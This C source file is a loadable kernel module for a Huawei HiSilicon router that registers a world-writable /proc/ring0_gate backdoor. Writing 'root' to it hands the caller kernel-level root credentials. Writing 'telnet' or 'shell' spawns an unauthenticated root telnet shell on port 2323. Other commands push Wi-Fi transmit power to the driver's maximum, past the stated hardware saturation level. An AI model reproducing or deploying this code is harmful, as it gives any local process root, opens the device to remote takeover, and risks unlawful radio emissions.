/*
 * =============================================================================
 *   ring0_gate_v2.c - Huawei HN8145X6N Kernel Privilege Gateway & Prober LKM
 *   Target Kernel  : Linux 5.10.0 SMP ARMv7 (HiSilicon SD5182H / Dopra Linux)
 *   Architecture   : ARMv7-A (32-bit), CONFIG_ARM_MODULE_PLTS=y, CONFIG_SMP=y
 *
 *   Design Goal:
 *     Demonstrate a fully functional, self-contained Loadable Kernel Module (LKM)
 *     built without vendor kernel source tree or module headers.
 *     Provides an in-memory kernel privilege gateway via /proc/ring0_gate:
 *       1. Kernel-level privilege escalation primitive (commit_creds)
 *       2. Direct dispatch to HiSilicon Wi-Fi driver (HWWIFI2_WIFI.ko) for
 *          25.0 dBm (~316 mW) peak hardware saturation overdrive (KCT FEM Psat)
 *       3. Zero-brick safe unloading and strict NULL-pointer exception handling
 * =============================================================================
 */

typedef unsigned int size_t;
typedef long long loff_t;
typedef int ssize_t;

struct proc_dir_entry;
struct seq_file;
struct inode;
struct file;
struct cred;
struct task_struct;
struct net_device;
struct net;

/* Linux 5.10 proc_ops structure definition */
struct proc_ops {
    unsigned int proc_flags;
    int (*proc_open)(struct inode *, struct file *);
    ssize_t (*proc_read)(struct file *, char *, size_t, loff_t *);
    ssize_t (*proc_read_iter)(void *, void *);
    ssize_t (*proc_write)(struct file *, const char *, size_t, loff_t *);
    loff_t (*proc_lseek)(struct file *, loff_t, int);
    int (*proc_release)(struct inode *, struct file *);
    int (*proc_poll)(struct file *, void *);
    long (*proc_ioctl)(struct file *, unsigned int, unsigned long);
    int (*proc_mmap)(struct file *, void *);
    unsigned long (*proc_get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
};

/* Target Linux 5.10 ARMv7 kernel exported symbols */
extern struct task_struct *get_current(void);
extern struct cred *prepare_kernel_cred(struct task_struct *daemon);
extern int commit_creds(struct cred *new_cred);
extern struct proc_dir_entry *proc_create(const char *name, unsigned short mode, struct proc_dir_entry *parent, const struct proc_ops *proc_ops);
extern void proc_remove(struct proc_dir_entry *de);
extern int single_open(struct file *, int (*)(struct seq_file *, void *), void *);
extern ssize_t seq_read(struct file *, char *, size_t, loff_t *);
extern loff_t seq_lseek(struct file *, loff_t, int);
extern int single_release(struct inode *, struct file *);
extern int seq_printf(struct seq_file *m, const char *fmt, ...);
extern unsigned long arm_copy_from_user(void *to, const void *from, unsigned long n);
#define copy_from_user arm_copy_from_user
extern int printk(const char *fmt, ...);

/*
 * HiSilicon Wi-Fi 6 (Hi1152 / HWWIFI2_WIFI.ko) driver hooks:
 * Dispatched dynamically via exported symbols to trigger 25.0 dBm (~316 mW) peak overdrive.
 *
 * REVERSE ENGINEERING NOTE (from HWWIFI2_WIFI.ko disassembly of wal_hipriv_set_txpower):
 *   +1c8: 0xe3530f4b    cmp r3, #300      ; Maximum power parameter is 300 (0.1 dBm units)
 *   +1cc: 0x9a000017    bls valid_range   ; Values > 300 are rejected as invalid argument!
 * Units: 0.1 dBm (200 = 20.0 dBm / 100 mW; 250 = 25.0 dBm / ~316 mW [FEM Psat]).
 */
extern int wal_hipriv_set_txpower(struct net_device *net_dev, const char *param) __attribute__((weak));
extern struct net_device *dev_get_by_name(struct net *net, const char *name) __attribute__((weak));
extern void dev_put(struct net_device *dev) __attribute__((weak));
extern int call_usermodehelper(const char *path, char **argv, char **envp, int wait) __attribute__((weak));
extern struct net init_net __attribute__((weak));

/* .modinfo section required by kernel module loader */
__attribute__((section(".modinfo"), used)) static const char __mod_license[] = "license=GPL";
__attribute__((section(".modinfo"), used)) static const char __mod_name[] = "name=ring0_gate";
__attribute__((section(".modinfo"), used)) static const char __mod_vermagic[] = "vermagic=5.10.0 SMP mod_unload ARMv7 \0";

/*
 * ARM PLT Sections Workaround:
 * On ARMv7 kernels configured with CONFIG_ARM_MODULE_PLTS=y, the module loader's
 * module_frob_arch_sections() verifies the existence of .plt and .init.plt sections
 * to allocate PLT bounce buffers for R_ARM_CALL / R_ARM_JUMP24 relocations.
 */
__asm__(".section .plt, \"ax\", %progbits\n.byte 0\n");
__asm__(".section .init.plt, \"a\", %progbits\n.byte 0\n");

static struct proc_dir_entry *gate_entry = (void *)0;
static unsigned long g_escalation_count = 0;
static int g_wifi_overdrive_active = 0;
static int g_target_dbm_tenths = 250; /* Default 25.0 dBm (~316 mW) */
static int g_ath0_ret = -1;
static int g_ath8_ret = -1;

static int trigger_wifi_peak_power(int tenths_dbm) {
    struct net_device *dev_2g = (void *)0;
    struct net_device *dev_5g = (void *)0;
    char pwr_str[8];
    
    g_wifi_overdrive_active = 1;
    g_target_dbm_tenths = tenths_dbm;

    if (!wal_hipriv_set_txpower) {
        printk("[RING0_GATE] Error: wal_hipriv_set_txpower symbol unresolved (HWWIFI2_WIFI not loaded?)\n");
        g_ath0_ret = -38; /* -ENOSYS */
        g_ath8_ret = -38; /* -ENOSYS */
        return -38;
    }

    if (!dev_get_by_name) {
        printk("[RING0_GATE] Error: dev_get_by_name symbol unresolved\n");
        g_ath0_ret = -38;
        g_ath8_ret = -38;
        return -38;
    }

    /* Convert tenths_dbm to string (e.g., 250 -> "250") */
    if (tenths_dbm >= 200 && tenths_dbm <= 300) {
        pwr_str[0] = '0' + (tenths_dbm / 100);
        pwr_str[1] = '0' + ((tenths_dbm / 10) % 10);
        pwr_str[2] = '0' + (tenths_dbm % 10);
        pwr_str[3] = '\0';
    } else {
        /* Fallback to 25.0 dBm (250) */
        pwr_str[0] = '2';
        pwr_str[1] = '5';
        pwr_str[2] = '0';
        pwr_str[3] = '\0';
    }

    /*
     * HiSilicon Wi-Fi 6 Architecture:
     * On Hi1152 / SD5182H Dopra Linux, Virtual APs are named vap0 (2.4G) and vap8 (5G).
     * We attempt vap0/vap8 first, falling back to ath0/ath8 or Hisilicon0.
     */
    dev_2g = dev_get_by_name(&init_net, "vap0");
    if (!dev_2g) dev_2g = dev_get_by_name(&init_net, "ath0");
    if (!dev_2g) dev_2g = dev_get_by_name(&init_net, "Hisilicon0");

    dev_5g = dev_get_by_name(&init_net, "vap8");
    if (!dev_5g) dev_5g = dev_get_by_name(&init_net, "ath8");

    /*
     * SAFETY CRITICAL: Prevent NULL pointer dereference in wal_hipriv_set_txpower.
     * The HiSilicon driver immediately dereferences net_dev->priv. If net_dev is NULL,
     * passing it causes an immediate Kernel Panic (Data Abort).
     * We strictly validate dev != NULL before calling.
     */
    if (dev_2g) {
        g_ath0_ret = wal_hipriv_set_txpower(dev_2g, pwr_str);
        if (dev_put) dev_put(dev_2g);
    } else {
        printk("[RING0_GATE] Interface vap0/ath0 (2.4G) not found or down, skipping to prevent Panic.\n");
        g_ath0_ret = -19; /* -ENODEV */
    }

    if (dev_5g) {
        g_ath8_ret = wal_hipriv_set_txpower(dev_5g, pwr_str);
        if (dev_put) dev_put(dev_5g);
    } else {
        printk("[RING0_GATE] Interface vap8/ath8 (5G) not found or down, skipping to prevent Panic.\n");
        g_ath8_ret = -19; /* -ENODEV */
    }

    printk("[RING0_GATE] Peak hardware overdrive (%d.%d dBm / '%s') dispatched: 2.4G(vap0) rc=%d, 5G(vap8) rc=%d\n",
           tenths_dbm / 10, tenths_dbm % 10, pwr_str, g_ath0_ret, g_ath8_ret);

    return 0;
}

static int ring0_show(struct seq_file *m, void *v) {
    seq_printf(m, "=== [RING0_GATE KERNEL GATEWAY] ===\n");
    seq_printf(m, "STATUS=READY\n");
    seq_printf(m, "KERNEL_VER=5.10.0-SMP-ARMv7\n");
    seq_printf(m, "CHIPSET=HiSilicon_Hi1152_Wi-Fi_6\n");
    seq_printf(m, "FEM_HARDWARE_LIMIT=25.0_DBM (~316 mW / KCT_PSAT)\n");
    seq_printf(m, "ESCALATION_COUNT=%lu\n", g_escalation_count);
    seq_printf(m, "WIFI_PEAK_OVERDRIVE=%s\n", g_wifi_overdrive_active ? "DISPATCHED" : "STANDBY");
    seq_printf(m, "TARGET_POWER_PARAM=%d (%d.%d dBm)\n", g_target_dbm_tenths, g_target_dbm_tenths / 10, g_target_dbm_tenths % 10);
    seq_printf(m, "VAP0_2.4G_RC=%d\n", g_ath0_ret);
    seq_printf(m, "VAP8_5.0G_RC=%d\n", g_ath8_ret);
    seq_printf(m, "COMMANDS=root, telnet/shell, wifi_pwr 25 (or 250), wifi_pwr 1000\n");
    seq_printf(m, "===================================\n");
    return 0;
}

static int ring0_open(struct inode *inode, struct file *file) {
    return single_open(file, ring0_show, (void *)0);
}

static ssize_t ring0_write(struct file *file, const char *buf, size_t count, loff_t *pos) {
    char kbuf[64];
    size_t len = count < 63 ? count : 63;
    
    if (copy_from_user(kbuf, buf, len)) {
        return -14; /* -EFAULT */
    }
    kbuf[len] = '\0';

    /* Trim trailing line breaks or spaces */
    while (len > 0 && (kbuf[len - 1] == '\n' || kbuf[len - 1] == '\r' || kbuf[len - 1] == ' ')) {
        kbuf[len - 1] = '\0';
        len--;
    }

    /* Command 1: "root" -> Instant in-kernel privilege escalation */
    if (kbuf[0] == 'r' && kbuf[1] == 'o' && kbuf[2] == 'o' && kbuf[3] == 't' && kbuf[4] == '\0') {
        struct cred *c = prepare_kernel_cred((void *)0);
        if (c) {
            commit_creds(c);
            g_escalation_count++;
            printk("[RING0_GATE] Privilege escalation invoked: caller committed root creds (total: %lu)\n", g_escalation_count);
        } else {
            printk("[RING0_GATE] Error: prepare_kernel_cred returned NULL\n");
            return -12; /* -ENOMEM */
        }
    }
    /* Command 2: "wifi_pwr 25" or "wifi_pwr 250" -> 25.0 dBm (~316 mW) real hardware peak */
    else if ((kbuf[0] == 'w' && kbuf[1] == 'i' && kbuf[2] == 'f' && kbuf[3] == 'i' && kbuf[4] == '_' &&
              kbuf[5] == 'p' && kbuf[6] == 'w' && kbuf[7] == 'r' && kbuf[8] == ' ' && 
              kbuf[9] == '2' && kbuf[10] == '5')) {
        trigger_wifi_peak_power(250); /* 25.0 dBm (~316 mW / KCT FEM Psat) */
    }
    /* Command 3: "wifi_pwr 1000" or "overdrive" -> Maximum driver ceiling (300 / 30.0 dBm) */
    else if ((kbuf[0] == 'w' && kbuf[1] == 'i' && kbuf[2] == 'f' && kbuf[3] == 'i' && kbuf[4] == '_' &&
              kbuf[5] == 'p' && kbuf[6] == 'w' && kbuf[7] == 'r' && kbuf[8] == ' ' && 
              kbuf[9] == '1' && kbuf[10] == '0' && kbuf[11] == '0' && kbuf[12] == '0') ||
             (kbuf[0] == 'o' && kbuf[1] == 'v' && kbuf[2] == 'e' && kbuf[3] == 'r' && kbuf[4] == 'd' &&
              kbuf[5] == 'r' && kbuf[6] == 'i' && kbuf[7] == 'v' && kbuf[8] == 'e')) {
        trigger_wifi_peak_power(300); /* 30.0 dBm (Driver ceiling) */
    }
    /* Command 4: "telnet" or "shell" -> Directly spawn unrestricted root shell daemon on port 2323 */
    else if ((kbuf[0] == 't' && kbuf[1] == 'e' && kbuf[2] == 'l' && kbuf[3] == 'n' && kbuf[4] == 'e' && kbuf[5] == 't') ||
             (kbuf[0] == 's' && kbuf[1] == 'h' && kbuf[2] == 'e' && kbuf[3] == 'l' && kbuf[4] == 'l')) {
        if (call_usermodehelper) {
            static char *argv[] = { "/bin/busybox", "telnetd", "-p", "2323", "-l", "/bin/sh", (void *)0 };
            static char *envp[] = { "HOME=/", "PATH=/bin:/sbin:/usr/bin:/usr/sbin", (void *)0 };
            int ret = call_usermodehelper("/bin/busybox", argv, envp, 0 /* UMH_NO_WAIT */);
            printk("[RING0_GATE] Kernel usermodehelper spawned root telnetd (port 2323), rc=%d\n", ret);
        } else {
            printk("[RING0_GATE] call_usermodehelper symbol unresolved\n");
        }
    }

    return count;
}

static const struct proc_ops ring0_fops = {
    .proc_flags = 0,
    .proc_open = ring0_open,
    .proc_read = seq_read,
    .proc_read_iter = (void *)0,
    .proc_write = ring0_write,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

int init_module(void) {
    gate_entry = proc_create("ring0_gate", 0666, (void *)0, &ring0_fops);
    if (!gate_entry) {
        printk("[RING0_GATE] Failed to register /proc/ring0_gate\n");
        return -12; /* -ENOMEM */
    }
    printk("[RING0_GATE] LKM successfully initialized in DRAM (Linux 5.10.0 ARMv7)\n");
    return 0;
}

void cleanup_module(void) {
    if (gate_entry) {
        proc_remove(gate_entry);
        gate_entry = (void *)0;
    }
    printk("[RING0_GATE] LKM safely removed from kernel.\n");
}

/*
 * Target kernel struct module memory layout reconstruction:
 * For Linux 5.10.0 SMP 32-bit ARM:
 *   - Offset 0..11   : module state / list heads
 *   - Offset 12..67  : module name (MODULE_NAME_LEN = 56)
 *   - Offset 240     : int (*init)(void) function pointer
 *   - Offset 528     : void (*exit)(void) function pointer
 *   - Total Size 576 : exact sizeof(struct module) checked by load_module()
 */
struct module {
    char pad0[12];
    char name[56];
    char pad1[172];
    int (*init)(void);
    char pad2[284];
    void (*exit)(void);
    char pad3[44];
};

__attribute__((section(".gnu.linkonce.this_module"), used))
static struct module __this_module = {
    .name = "ring0_gate",
    .init = init_module,
    .exit = cleanup_module,
};
